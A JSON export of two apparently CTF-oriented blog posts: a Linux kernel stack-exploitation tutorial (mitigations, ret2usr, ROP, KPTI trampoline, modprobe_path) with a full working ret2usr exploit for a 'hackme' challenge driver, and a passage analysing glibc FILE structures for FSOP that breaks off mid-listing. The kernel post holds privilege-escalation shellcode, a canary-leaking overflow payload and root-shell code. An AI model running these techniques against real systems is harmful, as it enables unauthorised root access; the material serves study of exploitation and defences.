[{"title":"Stack-based exploits in Linux kernel","url":"/2024/01/29/stack-linux-kernel/","content":"# Stack-based exploits in Linux kernel\n\n## Mitigations\n### 1. SMEP\n- dont allow to execute user space code\n- in qemu, to enable SMEP we use `-cpu+smep`  to disasble it use `-append nosmep`\n- SMEP is a hardware security mechanism.¬†Setting the 21st bit of the CR4 register enables SMEP.\n\n### 2. SMAP\n\n- kernel space cannot read or write userspace memory\n- to do that we need to use copy_from_user / copy_to_user\n\n### 3. Kernel Canary\n\n- the same as stack canary on user land\n- enabled in the kernel at compile time and cannot be disabled.\n\n### 4. KASLR\n\n- randomizes the base address where the kernel is loaded each time the system is booted\n- It can be enabled/disabled by adding¬†`kaslr`¬†or¬†`nokaslr`¬†under¬†`-append`¬†option.\n\n### 5. KPTI (Kernel Page-Table Isolation)\n\n- prevent Meltdown (side-channel attack)\n\n### 6. KADR (Kernel Address Display Restriction)\n\n- hide kernel address /proc/kallsyms\n- `/proc/sys/kernel/kptr_restrict` : 0 to disable it\n\nKernel have sus function : `run_cmd(char * cmd)` : run cmd in userspace as root.\n\n## Stack-base technique\n### 1. ret2usr\nThis exploit take advantage of kernel space process can see userspace process ‚Üí execute code in userspace with kernel permission (root) \n\n#### Requirements :\n\n- SMEP must be off\n- overflow must be possible\n- ability to leak ( at least canary)\n\n#### Ideas:\n\nOverwrite return address of a kernel process to the process we can control in user space\n\n##### Steps:\n\n- save register state (`cs ,ss ,rsp,rflags`) in user space\n- escalate privilege before return to user space (`commit_creds(prepare_kernel_cred(0))` )\n- Return to user mode from kernel mode in kernel space + restore register state\n- get shell\n\n#### Details\n\n##### Save registers state\n\nThe process keep track of 2 different states of register in kernel and user mode. Because we want to execute `system('/bin/sh')` in user mode so we need to restore user mode‚Äôs state \n\nThese states should not random so before an access to kernel space process it must save states.\n\n```c\nunsigned long long user_cs, user_ss, user_rflags, user_sp, user_rip = (unsigned long long)get_shell;\nvoid save_state(){\n    __asm__(\n        \".intel_syntax noprefix;\"\n        \"mov user_cs, cs;\"\n        \"mov user_ss, ss;\"\n        \"mov user_sp, rsp;\"\n        \"pushf;\"\n        \"pop user_rflags;\"\n        \".att_syntax;\"\n    );\n    puts(\"[*] Saved state\");\n}\n```\n\n##### Escalate privilege + switch to user mode + restore states\n\nTo escalate privilege, we simply use `commit_creds(prepare_kernel_cred(0))`\n\nTo switch to user mode, to process must use 1 of these : \n\n- `sysretq` : complicated to setup\n- `iretq` : commonly use\n\n`iretq`  require stack to setup with **5 userland register values**¬†in this order:¬†`RIP|CS|RFLAGS|SP|SS` ‚Üí the value we save earlier\n\n- for rip, we need to set it to the `get_shell()` address to get shell\n\nOn x86/64, `swapgs`  instruction must be call before `iretq`\n\nFinally, we just push the save state register to stack\n\n```c\nunsigned long long user_cs, user_ss, user_rflags, user_sp, user_rip = (unsigned long long)get_shell;\nvoid leo_quyen()\n{\n\t__asm__(\n\t\".intel_syntax noprefix;\"\n\t\"movabs rax, 0xffffffff814c67f0;\"\n\t\"xor rdi, rdi;\"\n\t\"call rax;\"\n\t\"mov rdi,rax;\"\n\t\"movabs rax,0xffffffff814c6410;\"\n\t\"call rax;\"\n\t\"swapgs;\"\n    \"mov r15, user_ss;\"\n    \"push r15;\"\n    \"mov r15, user_sp;\"\n    \"push r15;\"\n    \"mov r15, user_rflags;\"\n    \"push r15;\"\n    \"mov r15, user_cs;\"\n    \"push r15;\"\n    \"mov r15, user_rip;\"\n    \"push r15;\"\n    \"iretq;\"\n\t\".att_syntax;\"\n\t\t);\n}\n```\n### 2. Bypass SMEP/SMAP\nSMEP mitigation is similar to NX in userland. SMEP enable by enable the 20th bit of CR4 register (start from 0) \n\n![image](https://hackmd.io/_uploads/SJow9EH9p.png)\n\n\n#### a. Overwrite CR4 register\n\nThere is an api in kernel  `native_write_cr4(value)` \n\n‚Üí ROPchain : pop rdi ‚Üí `native_write_cr4()` ‚Üí `prepare_kernel_cred()` ‚Üí ‚Ä¶.\n\nWe do that by zero out the 20th bit of CR4 register.\n\nBut in newer version of kernel , CR4 register cannot be change after boot by using pin. ‚Üí If we change, it will set to the default boot value\n\n#### b. ROPchain\n\nBecause we can‚Äôt execute code in user space , we can use gadget in kernel space. \n\nNote that these gadgets from ROPgadget not always works because it don‚Äôt known that memory area is executable or not ‚Üí try and error\nAlso work with SMAP enable\n\n##### Can overwrite more that return address\n\nJust build a normal ROP chain to call `prepare_kernel_cred()`‚Ä¶\n\n##### Can overwrite only return address (stack pivot)\n\nFind a gadget that can mov some value to `rsp` , ex : *`mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret`*\n\nIn user space we mmap a region to build ROP chain.\n\nThis is possible due to SMAP is disable.\n\n```basic\nvoid build_fake_stack(void){\n    fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|M, -1, 0);\n    unsigned off = 0x1000 / 8;\n    fake_stack[0] = 0xdead; // put something in the first page to prevent fault\n    fake_stack[off++] = 0x0; // dummy r12\n    fake_stack[off++] = 0x0; // dummy rbp\n    fake_stack[off++] = pop_rdi_ret;\n    ... // the rest of the chain is the same as the last payload\n}\n```\n\nNot work with SMAP\n\n### 3. KPTI trampoline (KPTI bypass)\n#### Bypass\n2 way to bypass:\n- using signal handler in userland\n    `signal(SIGSEGV, get_shell)`\n- KPTI trampoline\n#### KPTI trampoline\n\nkernel have a function : `swapgs_restore_regs_and_return_to_usermode()` to swap kernel page to user page\n\nit will restore by pop a lots of regs in stack ‚Üí ret2 `swapgs_restore_regs_and_return_to_usermode + 22`\n\n![Untitledc77a1695b3efbfd4.png](https://img.upanh.tv/2024/01/29/Untitledc77a1695b3efbfd4.png)\n\n\n`modprobe` is store under `modprobe_path` symbol in the linux kernel\n\nIt will invoke when these function is call in userland :\n\n- system()\n- execve()\n- ‚Ä¶\n\nWhen we call `system(‚Äô/tmp/cc‚Äô)` and file signature of `cc` is unknown it will call `modprobe` \nTherefore, we have arbitrary command execution.\nNote that we don‚Äôt need to use `commit_creds(prepare_kernel_cred(0))` ‚Üí shorter ROP\n\n### 4. modprobe_path\n- Exploit kernel vuln to archive ROP in kernel space\n- Find gadget to overwrite `modprobe_path`  in to new_path. Ex : `/tmp/cc`\n- Return to user space\n- Now we create that file in user space\n    ```c\n    system(\"echo '#!/bin/sh\\ncp /dev/sda /tmp/flag\\nchmod 777 /tmp/flag' > /tmp/x\");\n    system(\"chmod +x /tmp/x\");\n    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n    system(\"chmod +x /tmp/dummy\");\n    ```\n- Run that file\n    ```c\n    puts(\"[*] Run unknown file\");\n    system(\"/tmp/dummy\");\n    ```\n    \n## Debug + DEMO\n### 1. Debug\nFirst we need to set our kernel to have root ‚Üí ez to debug (by extract cpio file\nSecond, remove some mitigations (typically in run.sh script provided by the challenge) ‚Üí reads kernel symbol easier\n\nInside the qemu script add: \n\n```bash\n-gdb tcp::1234\n```\n\nWrite a [pack.sh](http://pack.sh) script :\n\n```bash\n#!/bin/sh\ngcc -o exp -static exp.c\nmv ./exp ./root\ncd ./root\nfind . -print0 \\\n| cpio -o --format=newc  --null --owner=root  \\\n| gzip -9 > initramfs.cpio.gz\nmv ./initramfs.cpio.gz ../\n```\n\n- `exp.c` is the exploit i write in C.\n- `./root` is the folder contain file system extract by the provided `initramfs.cpio.gz`\n\nI also write a python script to automate the process of packing and running the kernel + debug\n```python\nfrom pwn import *\nimport os \n\ndef debug():\n\tcommand = f\"\"\"target remote 127.0.0.1:1234\nc\nksymaddr-remote-apply\nc\n\t\"\"\"\n\tinit = f\"\"\"#!/usr/bin/python3\nimport os\nos.execve('/usr/bin/gdb', ['/usr/bin/gdb', '-q', '-x', '/tmp/QEMU_debug.gdb'], os.environ)\n\t\"\"\"\n\twith open('/tmp/run_GDB','wt') as f:\n\t\tf.write(init)\n\twith open('/tmp/QEMU_debug.gdb', 'wt') as f:\n\t\tf.write(command)\n\tos.chmod(\"/tmp/run_GDB\",stat.S_IRWXU)\n\tos.chmod(\"/tmp/QEMU_debug.gdb\",stat.S_IRWXU)\n\tif (args.GDB):\n\t\tdebug_process = process(['cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', '-d', '.', 'wsl.exe', '-d', 'Ubuntu', 'bash', '-c', '/tmp/run_GDB'])\n\ndef start():\n\tos.system(\"./pack.sh\")\n\tdebug()\n\tos.system(\"./run.sh\")\n\nif __name__==\"__main__\": \n\tstart()\n```\n\n### 2. Demo ret2usr\n[Challenge](https://2020.ctf.link/assets/files/kernel-rop-bf9c106d45917343.tar.xz)\n\nwe need to modify the run.sh script\n```bash\n#!/bin/sh\nqemu-system-x86_64 \\\n    -m 128M \\\n    -cpu kvm64\\\n    -kernel vmlinuz \\\n    -initrd initramfs.cpio.gz \\\n    -snapshot \\\n    -nographic \\\n    -monitor /dev/null \\\n    -no-reboot \\\n    -append \"console=ttyS0 nopti nokaslr quiet panic=1\" \\\n    -gdb tcp::1234\n```\nWe can read the stack freely on `hackme_read`\n\n![Screenshot 2024-01-29 204256](https://hackmd.io/_uploads/ryiEcEr9p.png)\nAnd stack buffer overflow on `hackme_write`\n\n![Screenshot 2024-01-29 203824](https://hackmd.io/_uploads/rkTbcEB9p.png)\n\n\nBase on this we can see the device name is `hackme`\n![Screenshot 2024-01-29 204829](https://hackmd.io/_uploads/S1yX9NH9a.png)\n\n\n\nFirst we need to open the device\n\n```clike\nvoid open_dev()\n{\n\tdevice_fd = open(device_name,O_RDWR);\n\tif (device_fd < 0)\n\t{\n\t\tputs(\"[!] Cannot open device...\\nExiting...\");\n\t\texit(-1);\n\t} else \n\t\tputs(\"[*] Opened device\");\n}\n```\n\nTo do ret2usr we must able to ROP -> leak canary\n\n```clike\nvoid leak_canary()\n{\n\tunsigned long long leak[4] = {};\n\tread(device_fd,leak,sizeof(leak));\n\tcanary = leak[2];\n\tprintf(\"[*] CANARY : 0x%llx\\n\",canary);\n}\n\n```\n\nNow we set breakpoint at \n![Screenshot 2024-01-29 205206](https://hackmd.io/_uploads/HJhtc4Hqp.png)\n\n![Screenshot 2024-01-29 205351](https://hackmd.io/_uploads/H1Sc54B96.png)\n\n\nIt copy the what store at rsi to rdi with len 0x20\n\n![Screenshot 2024-01-29 210119](https://hackmd.io/_uploads/SJTiKErqa.png)\n\nAt offset 2 is canary\n![image](https://hackmd.io/_uploads/HklcF4rqT.png)\n\n\nNow we can just find the offset to overflow the save rip in `hackme_write`\nNote that smep is off so we can freely run userspace code in kernel space\n\n```clike\nvoid leo_quyen()\n{\n\t__asm__(\n\t\".intel_syntax noprefix;\"\n\t\"movabs rax, 0xffffffff814c67f0;\"\n\t\"xor rdi, rdi;\"\n\t\"call rax;\"\n\t\"mov rdi,rax;\"\n\t\"movabs rax,0xffffffff814c6410;\"\n\t\"call rax;\"\n\t\"swapgs;\"\n    \"mov r15, user_ss;\"\n    \"push r15;\"\n    \"mov r15, user_sp;\"\n    \"push r15;\"\n    \"mov r15, user_rflags;\"\n    \"push r15;\"\n    \"mov r15, user_cs;\"\n    \"push r15;\"\n    \"mov r15, user_rip;\"\n    \"push r15;\"\n    \"iretq;\"\n\t\".att_syntax;\"\n\t\t);\n}\n\nvoid overwrite()\n{\n\tunsigned long long payload[21] = {};\n\tfor (int i =0;i<=15;i++)\n\t\tpayload[i] = 0x6161616161616161;\n\tpayload[16] = canary ;\n\tpayload[17] = 0;\n\tpayload[18] = 0;\n\tpayload[19] = 0;\n\tpayload[20] = (unsigned long long )leo_quyen+8;\n\tif (write(device_fd,payload,sizeof(payload)) <0)\n\t{\n\t\tputs(\"[!] Cannot write to device...\\nExiting...\");\n\t\texit(-1);\n\t}\n\telse\n\t\tputs(\"[*] Write successfully\");\n\n}\n```\nBefore run that code we need to save registers state\n```clike\nvoid save_state()\n{\n\t__asm__(\n    \".intel_syntax noprefix;\"\n    \"mov user_cs, cs;\"\n    \"mov user_ss, ss;\"\n    \"mov user_sp, rsp;\"\n    \"pushf;\"\n    \"pop user_rflags;\"\n    \".att_syntax;\"\n    );\n    puts(\"[*] Saved state\");\n}\n```\n\nBefore overflow\n![Screenshot 2024-01-29 211949](https://hackmd.io/_uploads/HJbNFEH9T.png)\n\n\nAfter overflow\n![Screenshot 2024-01-29 212119](https://hackmd.io/_uploads/rJMXKVB9T.png)\n\n\n\n- Final exp:\n```clike\n#include <stdio.h>\n#include <fcntl.h>\n#include <stdlib.h>\n\n#define device_name \"/dev/hackme\"\n#define commit_creds 0xffffffffc000016a\n#define prepare_kernel_cred 0xffffffff814c67f0\n\nint device_fd ;\nunsigned long long canary;\n\nvoid open_dev()\n{\n\tdevice_fd = open(device_name,O_RDWR);\n\tif (device_fd < 0)\n\t{\n\t\tputs(\"[!] Cannot open device...\\nExiting...\");\n\t\texit(-1);\n\t} else \n\t\tputs(\"[*] Opened device\");\n}\n\n\nvoid leak_canary()\n{\n\tunsigned long long leak[4] = {};\n\tread(device_fd,leak,sizeof(leak));\n\tcanary = leak[2];\n\tprintf(\"[*] CANARY : 0x%llx\\n\",canary);\n}\n\nvoid get_shell()\n{\n\tif (getuid()==0)\n\t{\n\t\tputs(\"[!] Become ROOT\");\n\t\tsystem(\"/bin/sh\");\n\t}else\n\t{\t\n\t\tputs(\"[*] Something wrong\");\n\t\texit;\n\t}\n}\n\nunsigned long long user_cs, user_ss, user_rflags, user_sp, user_rip = (unsigned long long)get_shell;\nvoid leo_quyen()\n{\n\t__asm__(\n\t\".intel_syntax noprefix;\"\n\t\"movabs rax, 0xffffffff814c67f0;\"\n\t\"xor rdi, rdi;\"\n\t\"call rax;\"\n\t\"mov rdi,rax;\"\n\t\"movabs rax,0xffffffff814c6410;\"\n\t\"call rax;\"\n\t\"swapgs;\"\n    \"mov r15, user_ss;\"\n    \"push r15;\"\n    \"mov r15, user_sp;\"\n    \"push r15;\"\n    \"mov r15, user_rflags;\"\n    \"push r15;\"\n    \"mov r15, user_cs;\"\n    \"push r15;\"\n    \"mov r15, user_rip;\"\n    \"push r15;\"\n    \"iretq;\"\n\t\".att_syntax;\"\n\t\t);\n}\n\nvoid overwrite()\n{\n\tunsigned long long payload[21] = {};\n\tfor (int i =0;i<=15;i++)\n\t\tpayload[i] = 0x6161616161616161;\n\tpayload[16] = canary ;\n\tpayload[17] = 0;\n\tpayload[18] = 0;\n\tpayload[19] = 0;\n\tpayload[20] = (unsigned long long )leo_quyen+8;\n\tif (write(device_fd,payload,sizeof(payload)) <0)\n\t{\n\t\tputs(\"[!] Cannot write to device...\\nExiting...\");\n\t\texit(-1);\n\t}\n\telse\n\t\tputs(\"[*] Write successfully\");\n\n}\n\nvoid save_state()\n{\n\t__asm__(\n    \".intel_syntax noprefix;\"\n    \"mov user_cs, cs;\"\n    \"mov user_ss, ss;\"\n    \"mov user_sp, rsp;\"\n    \"pushf;\"\n    \"pop user_rflags;\"\n    \".att_syntax;\"\n    );\n    puts(\"[*] Saved state\");\n}\nint main()\n{\n\tsave_state();\n\topen_dev();\n\tleak_canary();\n\toverwrite();\n\treturn 0 ;\n}\n```\n\n## References:\n- https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/\n- https://github.com/pr0cf5/kernel-exploit-practice/tree/master\n- https://github.com/pr0cf5/kernel-exploit-practice/blob/master/bypass-smap/README.md","tags":["linux","kernel"],"categories":["pwn","stack overflow"]},{"title":"FSOP stdout","url":"/2023/10/13/fsop-stdout/","content":"# FSOP stdout\nFSOP stdout\n## Analysis\n\n### 1. fclose\n\n![](https://hackmd.io/_uploads/ry9OZ6LWp.png)\n\n`fclose()` ‚Üí `__IO_new_fclose`\n\n```c\n#define fclose(fp) _IO_new_fclose (fp)\n```\n\n- src (glibc-2.31)\n    \n    ```c\n    int\n    _IO_new_fclose (FILE *fp)\n    {\n      int status;\n    \n      CHECK_FILE(fp, EOF);\n    \n    #if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)\n      /* We desperately try to help programs which are using streams in a\n         strange way and mix old and new functions.  Detect old streams\n         here.  */\n      if (_IO_vtable_offset (fp) != 0)\n        return _IO_old_fclose (fp);\n    #endif\n    \n      /* First unlink the stream.  */\n      if (fp->_flags & _IO_IS_FILEBUF)\n        _IO_un_link ((struct _IO_FILE_plus *) fp);\n    \n      _IO_acquire_lock (fp);\n      if (fp->_flags & _IO_IS_FILEBUF)\n        status = _IO_file_close_it (fp);\n      else\n        status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;\n      _IO_release_lock (fp);\n      _IO_FINISH (fp);\n      if (fp->_mode > 0)\n        {\n          /* This stream has a wide orientation.  This means we have to free\n    \t the conversion functions.  */\n          struct _IO_codecvt *cc = fp->_codecvt;\n    \n          __libc_lock_lock (__gconv_lock);\n          __gconv_release_step (cc->__cd_in.step);\n          __gconv_release_step (cc->__cd_out.step);\n          __libc_lock_unlock (__gconv_lock);\n        }\n      else\n        {\n          if (_IO_have_backup (fp))\n    \t_IO_free_backup_area (fp);\n        }\n      _IO_deallocate_file (fp);\n      return status;\n    }\n    ```\n    \n\nControl Flow:\n\n1. check `fp` through `CHECK_FILE(fp, EOF);`\n2. if detect old streams (vtable available or not) then call  `_IO_old_fclose` \n3. if _flag  = 0x2000 (_IO_IS_FILEBUF) ‚Üí call `_IO_un_link`\n4. if _flag  = 0x2000 (_IO_IS_FILEBUF) ‚Üí call `_IO_file_close_it\n5. call `_IO_FINISH`\n\n### 2. __IO_un_link\n\n- scr (glibc-2.31)\n    \n    ```c\n    void\n    _IO_un_link (struct _IO_FILE_plus *fp)\n    {\n      if (fp->file._flags & _IO_LINKED)\n        {\n          FILE **f;\n    #ifdef _IO_MTSAFE_IO\n          _IO_cleanup_region_start_noarg (flush_cleanup);\n          _IO_lock_lock (list_all_lock);\n          run_fp = (FILE *) fp;\n          _IO_flockfile ((FILE *) fp);\n    #endif\n          if (_IO_list_all == NULL)\n    \t;\n          else if (fp == _IO_list_all)\n    \t_IO_list_all = (struct _IO_FILE_plus *) _IO_list_all->file._chain;\n          else\n    \tfor (f = &_IO_list_all->file._chain; *f; f = &(*f)->_chain)\n    \t  if (*f == (FILE *) fp)\n    \t    {\n    \t      *f = fp->file._chain;\n    \t      break;\n    \t    }\n          fp->file._flags &= ~_IO_LINKED;\n    #ifdef _IO_MTSAFE_IO\n          _IO_funlockfile ((FILE *) fp);\n          run_fp = NULL;\n          _IO_lock_unlock (list_all_lock);\n          _IO_cleanup_region_end (0);\n    #endif\n        }\n    }\n    ```\n    \n\nControl Flow:\n\n1. if `_flags = 0x0080` then doing the below stuff\n2. check if `fp == _IO_list_all` ‚Üí `_IO_list_all` point to the next fp in _chain\n3. loop from the _chain list starting from `_IO_list_all` , if found fp then remove it \n4. mark the _flag to indicate it closed `fp->file._flags &= ~_IO_LINKED`\n\n### 3. ****_IO_file_close_it****\n\n`_IO_file_close_it` ‚Üí`_IO_new_file_close_it`\n\n- src (glibc-2.31)\n    \n    ```c\n    int\n    _IO_new_file_close_it (FILE *fp)\n    {\n      int write_status;\n      if (!_IO_file_is_open (fp))\n        return EOF;\n    \n      if ((fp->_flags & _IO_NO_WRITES) == 0\n          && (fp->_flags & _IO_CURRENTLY_PUTTING) != 0)\n        write_status = _IO_do_flush (fp);\n      else\n        write_status = 0;\n    \n      _IO_unsave_markers (fp);\n    \n      int close_status = ((fp->_flags2 & _IO_FLAGS2_NOCLOSE) == 0\n    \t\t      ? _IO_SYSCLOSE (fp) : 0);\n    \n      /* Free buffer. */\n      if (fp->_mode > 0)\n        {\n          if (_IO_have_wbackup (fp))\n    \t_IO_free_wbackup_area (fp);\n          _IO_wsetb (fp, NULL, NULL, 0);\n          _IO_wsetg (fp, NULL, NULL, NULL);\n          _IO_wsetp (fp, NULL, NULL);\n        }\n      _IO_setb (fp, NULL, NULL, 0);\n      _IO_setg (fp, NULL, NULL, NULL);\n      _IO_setp (fp, NULL, NULL);\n    \n      _IO_un_link ((struct _IO_FILE_plus *) fp);\n      fp->_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;\n      fp->_fileno = -1;\n      fp->_offset = _IO_pos_BAD;\n    \n      return close_status ? close_status : write_status;\n    }\n    ```\n    \n\nControl Flow :\n\n1. check if file is open \n2. check if the file is open in write mode\n    - `_IO_NO_WRITES`  (0x0008)\n    - `_IO_CURRENTLY_PUTTING`\n    - if satisfied ‚Üí call `_IO_do_flush` to flush the buffer and initialize the pointers\n3. check _flags2 == `_IO_FLAGS2_NOCLOSE]`(32) ‚Üí `_IO_SYSCLOSE` (`__close` in vtable)\n\n### 4. puts\n\n`puts` ‚Üí `_IO_puts` \n\n- src\n    \n    ```c\n    int\n    _IO_puts (const char *str)\n    {\n      int result = EOF;\n      size_t len = strlen (str);\n      _IO_acquire_lock (stdout);\n    \n      if ((_IO_vtable_offset (stdout) != 0\n           || _IO_fwide (stdout, -1) == -1)\n          && _IO_sputn (stdout, str, len) == len\n          && _IO_putc_unlocked ('\\n', stdout) != EOF)\n        result = MIN (INT_MAX, len + 1);\n    \n      _IO_release_lock (stdout);\n      return result;\n    }\n    ```\n    \n\nNote that in the scr code, it will call  `_IO_sputn` which mean that `__xsputn` from vtable of stdout will be call \n\n```c\n(_IO_FILE_plus)_IO_2_1_stdout‚Üívtable.__xsputn(stdout, str, len)\n```\n\n**`_IO_new_file_xsputn`**\n\n- src\n    \n    ```c\n    size_t\n    _IO_new_file_xsputn (FILE *f, const void *data, size_t n)\n    {\n      const char *s = (const char *) data;\n      size_t to_do = n;\n      int must_flush = 0;\n      size_t count = 0;\n    \n      if (n <= 0)\n        return 0;\n      /* This is an optimized implementation.\n         If the amount to be written straddles a block boundary\n         (or the filebuf is unbuffered), use sys_write directly. */\n    \n      /* First figure out how much space is available in the buffer. */\n      if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))\n        {\n          count = f->_IO_buf_end - f->_IO_write_ptr;\n          if (count >= n)\n    \t{\n    \t  const char *p;\n    \t  for (p = s + n; p > s; )\n    \t    {\n    \t      if (*--p == '\\n')\n    \t\t{\n    \t\t  count = p - s + 1;\n    \t\t  must_flush = 1;\n    \t\t  break;\n    \t\t}\n    \t    }\n    \t}\n        }\n      else if (f->_IO_write_end > f->_IO_write_ptr)\n        count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */\n    \n      /* Then fill the buffer. */\n      if (count > 0)\n        {\n          if (count > to_do)\n    \tcount = to_do;\n          f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);\n          s += count;\n          to_do -= count;\n        }\n      if (to_do + must_flush > 0)\n        {\n          size_t block_size, do_write;\n          /* Next flush the (full) buffer. */\n          if (_IO_OVERFLOW (f, EOF) == EOF)\n    \t/* If nothing else has to be written we must not signal the\n    \t   caller that everything has been written.  */\n    \treturn to_do == 0 ? EOF : n - to_do;\n    \n          /* Try to maintain alignment: write a whole number of blocks.  */\n          block_size = f->_IO_buf_end - f->_IO_buf_base;\n          do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);\n    \n          if (do_write)\n    \t{\n    \t  count = new_do_write (f, s, do_write);\n    \t  to_do -= count;\n    \t  if (count < do_write)\n    \t    return n - to_do;\n    \t}\n    \n          /* Now write out the remainder.  Normally, this will fit in the\n    \t buffer, but it's somewhat messier for line-buffered files,\n    \t so we let _IO_default_xsputn handle the general case. */\n          if (to_do)\n    \tto_do -= _IO_default_xsputn (f, s+do_write, to_do);\n        }\n      return n - to_do;\n    }\n    ```\n    \n\nControl Flow :\n\n1. check available space in the buffer \n2. fill the buffer : `f->_IO_write_ptr` = `__mempcpy (f->_IO_write_ptr)`\n3. if to-do remain `_IO_OVERFLOW` is called\n4. finally call `_IO_default_xsputn` to write \n\n‚Üí we focus on`_IO_OVERFLOW`\n\n  `_IO_new_file_overflow`\n\n- scr\n    \n    ```c\n    int\n    _IO_new_file_overflow (FILE *f, int ch)\n    {\n      if (f->_flags & _IO_NO_WRITES) /* SET ERROR */\n        {\n          f->_flags |= _IO_ERR_SEEN;\n          __set_errno (EBADF);\n          return EOF;\n        }\n      /* If currently reading or no buffer allocated. */\n      if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)\n        {\n          /* Allocate a buffer if needed. */\n          if (f->_IO_write_base == NULL)\n    \t{\n    \t  _IO_doallocbuf (f);\n    \t  _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);\n    \t}\n          /* Otherwise must be currently reading.\n    \t If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\n    \t logically slide the buffer forwards one block (by setting the\n    \t read pointers to all point at the beginning of the block).  This\n    \t makes room for subsequent output.\n    \t Otherwise, set the read pointers to _IO_read_end (leaving that\n    \t alone, so it can continue to correspond to the external position). */\n          if (__glibc_unlikely (_IO_in_backup (f)))\n    \t{\n    \t  size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;\n    \t  _IO_free_backup_area (f);\n    \t  f->_IO_read_base -= MIN (nbackup,\n    \t\t\t\t   f->_IO_read_base - f->_IO_buf_base);\n    \t  f->_IO_read_ptr = f->_IO_read_base;\n    \t}\n    \n          if (f->_IO_read_ptr == f->_IO_buf_end)\n    \tf->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;\n          f->_IO_write_ptr = f->_IO_read_ptr;\n          f->_IO_write_base = f->_IO_write_ptr;\n          f->_IO_write_end = f->_IO_buf_end;\n          f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;\n    \n          f->_flags |= _IO_CURRENTLY_PUTTING;\n          if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))\n    \tf->_IO_write_end = f->_IO_write_ptr;\n        }\n      if (ch == EOF)\n        return _IO_do_write (f, f->_IO_write_base,\n    \t\t\t f->_IO_write_ptr - f->_IO_write_base);\n      if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */\n        if (_IO_do_flush (f) == EOF)\n          return EOF;\n      *f->_IO_write_ptr++ = ch;\n      if ((f->_flags & _IO_UNBUFFERED)\n          || ((f->_flags & _IO_LINE_BUF) && ch == '\\n'))\n        if (_IO_do_write (f, f->_IO_write_base,\n    \t\t      f->_IO_write_ptr - f->_IO_write_base) == EOF)\n          return EOF;\n      return (unsigned char) ch;\n    }\n    ```\n    \n\nControl Flow:\n\n1. check the file is writable : `if (f->_flags & _IO_NO_WRITES`\n2. checking stuff\n3. finally, if `ch = EOF` call `_IO_do_write`\n    \n    ‚Üí note `_IO_do_write`\n    \n\n`_IO_do_write` \n\n- src\n    \n    ```c\n    int\n    _IO_new_do_write (FILE *fp, const char *data, size_t to_do)\n    {\n      return (to_do == 0\n              || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;\n    }\n    ```\n    \n\n`new_do_write`\n\n- scr\n    \n    ```c\n    static size_t\n    new_do_write (FILE *fp, const char *data, size_t to_do)\n    {\n      size_t count;\n      if (fp->_flags & _IO_IS_APPENDING)\n        /* On a system without a proper O_APPEND implementation,\n           you would need to sys_seek(0, SEEK_END) here, but is\n           not needed nor desirable for Unix- or Posix-like systems.\n           Instead, just indicate that offset (before and after) is\n           unpredictable. */\n        fp->_offset = _IO_pos_BAD;\n      else if (fp->_IO_read_end != fp->_IO_write_base)\n        {\n          off64_t new_pos\n    \t= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);\n          if (new_pos == _IO_pos_BAD)\n    \treturn 0;\n          fp->_offset = new_pos;\n        }\n      count = _IO_SYSWRITE (fp, data, to_do);\n      if (fp->_cur_column && count)\n        fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;\n      _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);\n      fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;\n      fp->_IO_write_end = (fp->_mode <= 0\n    \t\t       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))\n    \t\t       ? fp->_IO_buf_base : fp->_IO_buf_end);\n      return count;\n    }\n    ```\n    \n\nIt will call `_IO_SYSWRITE` in our exploit, it is a leak.\n\n## Techniques\n\n### 1.  hijack vtable\n\noverwrite vtable and put appropriate address that we want to call in the vtable struct\n\n### 2. leak libc\n\n<aside>\nüí° Fake _flags and _IO_write_base then a function using stdout (puts,printf) call after , we will get the libc address\n\n</aside>\n\n![](https://hackmd.io/_uploads/BJ-1VTIW6.png)\n\n**Analysis :**\n\n- __flags have 4 bytes\n    - first 2 byte is `_IO_MAGIC` (`0xFBAD0000`)\n    - the rest is flags\n    - all flags\n        \n        ```c\n        /* Magic number and bits for the _flags field.  The magic number is\n           mostly vestigial, but preserved for compatibility.  It occupies the\n           high 16 bits of _flags; the low 16 bits are actual flag bits.  */\n        #define _IO_MAGIC         0xFBAD0000 /* Magic number */\n        #define _IO_MAGIC_MASK    0xFFFF0000\n        #define _IO_USER_BUF          0x0001 /* Don't deallocate buffer on close. */\n        #define _IO_UNBUFFERED        0x0002\n        #define _IO_NO_READS          0x0004 /* Reading not allowed.  */\n        #define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */\n        #define _IO_EOF_SEEN          0x0010\n        #define _IO_ERR_SEEN          0x0020\n        #define _IO_DELETE_DONT_CLOSE 0x0040 /* Don't call close(_fileno) on close.  */\n        #define _IO_LINKED            0x0080 /* In the list of all open files.  */\n        #define _IO_IN_BACKUP         0x0100\n        #define _IO_LINE_BUF          0x0200\n        #define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */\n        #define _IO_CURRENTLY_PUTTING 0x0800\n        #define _IO_IS_APPENDING      